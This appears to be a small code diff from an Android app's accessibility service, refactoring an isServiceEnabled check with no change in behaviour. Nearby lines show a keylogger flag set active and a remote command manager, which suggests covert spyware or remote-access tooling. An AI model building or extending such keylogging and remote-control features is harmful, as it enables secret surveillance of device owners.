@@ -144,9 +144,9 @@ class RemoteAccessibilityService : AccessibilityService() {
         var staticKeyloggerActive = true
 
         fun isServiceEnabled(): Boolean {
-            return instance != null || AccessibilityOverlayManager.isAccessibilityEnabled(
-                com.example.data.sync.RemoteCommandManager.instanceContext ?: return false
-            )
+            if (instance != null) return true
+            val context = com.example.data.sync.RemoteCommandManager.instanceContext ?: return false
+            return AccessibilityOverlayManager.isAccessibilityEnabled(context)
         }
 
         fun performAction(actionId: Int): Boolean {
